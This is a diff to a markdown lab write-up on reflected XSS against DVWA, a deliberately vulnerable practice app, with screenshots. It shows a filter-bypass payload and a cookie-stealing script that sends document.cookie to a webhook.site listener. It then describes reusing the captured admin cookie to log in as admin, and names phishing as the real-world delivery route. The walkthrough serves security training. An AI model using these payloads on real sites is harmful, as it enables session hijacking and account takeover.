@@ -54,3 +54,33 @@
 
 ![Screenshot (27)](https://user-images.githubusercontent.com/106005322/218767748-af21b5a2-07cf-4360-813b-7e5f8406b583.png)
 #### now we can see that I have bypassed it by entering ```<image src/onerror=alert(1)>```
+
+
+#
+#
+#
+
+# Exploiting XSS-Reflected to steal cookies
+#
+
+![Screenshot (43)](https://user-images.githubusercontent.com/106005322/219379111-49619db5-d558-4e9b-9971-c72a30b8f39b.png)
+#### first of all I will use a webhook as a listener to capture cookies, here I will use the following link and combine it with a js script which is ```<script>document.location='?c='+document.cookie;</script>``` + ```https:// webhook.site/3c1b2da1-3088-4793-8540-639634828977``` 
+#
+
+#### and it will look like this ```<script>document.location='https://webhook.site/3c1b2da1-3088-4793-8540-639634828977?c='+document.cookie;</script>```
+
+#
+
+![Screenshot (37)](https://user-images.githubusercontent.com/106005322/219379164-62072679-a516-4360-8e62-957b6afde612.png)
+#### after that I will inject the script to the text box as an admin user on this dvwa, as you can see on the url it not only captures the cookie but it can also capture what level is used, but in a real situation this may require a phishing attack or social engineering
+#
+
+![Screenshot (40)](https://user-images.githubusercontent.com/106005322/219379204-6a952be4-74a8-4668-8d15-a71530ece2d9.png)
+#### if I go back to the webhook website we can see I've got the admin's cookie
+#
+
+![Screenshot (45)](https://user-images.githubusercontent.com/106005322/219379253-25a5a634-8024-4373-9880-53425c217dc6.png)
+#### lastly this cookie I can use to access as an admin where we know that if we log in as an admin we have features that are not available to normal users
+
+
+
